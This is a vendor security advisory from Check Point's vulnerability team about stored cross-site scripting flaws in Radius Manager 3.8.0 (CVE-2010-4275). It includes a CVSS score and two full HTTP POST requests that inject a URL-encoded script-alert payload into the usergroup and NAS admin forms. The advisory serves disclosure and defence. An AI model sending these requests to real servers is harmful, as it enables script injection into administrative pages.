@@ -1,0 +1,91 @@
+Check Point Software Technologies - Vulnerability Discovery Team (VDT)
+http://www.checkpoint.com/defense/
+
+Radius Manager Multiple Cross Site Scripting Issues
+CVE-2010-4275
+
+
+INTRODUCTION
+
+Radius Manager is a centralized way for administration of Mikrotik, Cisco, Chillispot and StarOS routers and wireless 
+access points.  It has
+a centralized accounting system that uses Radius, provinding easy user and accounting management for ISP's.
+
+This problem was confirmed in the following versions of the Radius Manager, other versions maybe also affected.
+
+Radius Manager 3.8.0
+
+
+CVSS Scoring System
+
+The CVSS score is: 6.4
+        Base Score: 6.7
+        Temporal Score: 6.4
+We used the following values to calculate the scores:
+        Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:N
+        Temporal score is: E:F/RL:U/RC:C
+
+
+DETAILS
+
+The Radius Manager system is affected by Multiple Stored Cross Site Scripting.  The “Group Name” and “Description” in 
+“new_usergroup” menu do not 
+sanitize input data, allowing attacker to store malicious javascript code in a page.
+
+The same thing occurs with “new_nas” menu
+
+Request:
+http://<server>/admin.php?cont=update_usergroup&id=1
+POST /admin.php?cont=update_usergroup&id=1 HTTP/1.1
+Host: <server>
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.10) Gecko/20100914
+Firefox/3.6.10
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://<server>/admin.php?cont=edit_usergroup&id=1
+Cookie: PHPSESSID=fo1ba9oci06jjsqkqpvptftj43; login_admin=admin; online_ordercol=username; online_ordertype=ASC; 
+listusers_ordercol=username; 
+listusers_ordertype=DESC; listusers_lastorder=username
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 120
+name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&descr=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&Submit=Update
+
+Request 2:
+http://<serveR>/admin.php?cont=store_nas
+POST /admin.php?cont=store_nas HTTP/1.1
+Host: <server>
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.10) Gecko/20100914
+Firefox/3.6.10
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://<server>/admin.php?cont=new_nas
+Cookie: PHPSESSID=fo1ba9oci06jjsqkqpvptftj43; login_admin=admin; online_ordercol=username; online_ordertype=ASC; 
+listusers_ordercol=username; 
+listusers_ordertype=DESC; listusers_lastorder=username
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+name=Name&nasip=10.0.0.1&type=0&secret=1111&descr=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&Submit=Add+NAS
+
+
+
+CREDITS
+
+This vulnerability has been brought to our attention by Ulisses Castro from Conviso IT Security company 
+(http://www.conviso.com.br) and researched 
+internally by Rodrigo Rubira Branco from the Check Point Vulnerability Discovery Team (VDT).
+
+
+
+Rodrigo Rubira Branco
+Senior Security Researcher
+Vulnerability Discovery Team (VDT)
+Check Point Software Technologies
+http://www.checkpoint.com/defense
